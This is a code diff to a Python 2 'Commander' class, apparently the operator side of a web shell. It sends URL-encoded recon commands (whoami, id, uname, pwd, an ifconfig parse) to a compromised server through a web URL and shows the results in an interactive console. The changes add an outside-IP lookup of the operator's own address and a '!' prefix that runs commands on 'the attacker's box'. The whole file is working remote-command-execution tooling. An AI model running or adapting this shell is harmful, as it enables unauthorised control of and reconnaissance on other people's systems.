@@ -15,18 +15,24 @@ class Commander(object):
         self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')
 
     def ServerInfo(self):
-        self.source = source = map(str.strip, urlopen(self.url+self.cmd).readlines())
-
+        self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
+        local_ip = (urlopen('http://85.214.27.38/show_my_ip').readlines())[0].split(':')[1].strip()
+        available_commands = ['exit', 'clear', 'history', 'info']
         self.info = \
         '''\033[92m
         %s
-        User   : %s
-        ID     : %s
-        Kernel : %s
-        CWD    : %s
-        IPs    : %s
+        User     : %s
+        ID       : %s
+        Kernel   : %s
+        CWD      : %s
+        Host IPs : %s
+        Local IP : %s
+
         %s
-        \033[0m''' % ('-'*100, source[0], source[1], source[2], source[3], ', '.join(source[4:]), '-'*100)
+        \033[0m
+        \033[97m[+] Available commands: %s.\033[0m
+        \033[97m[+] Inserting\033[0m \033[91m!\033[0m \033[97mat the begining of the command will execute it on your box.\033[0m
+        ''' % ('-'*100, source[0], source[1], source[2], source[3], ', '.join(source[4:]), local_ip, '-'*100, available_commands)
         print self.info
 
     @staticmethod
@@ -48,7 +54,7 @@ class Commander(object):
                         for command in history:
                             print '%2d %s' % (x, command)
                             x += 1
-                    elif command.startswith('!'):                                       # inserting ! at the beginning of the command will execute the command on the attacker's box
+                    elif command.startswith('!'):
                         Popen(Commander.clean(command)[1:], shell=True).wait()
                     elif command == 'info':
                         print self.info
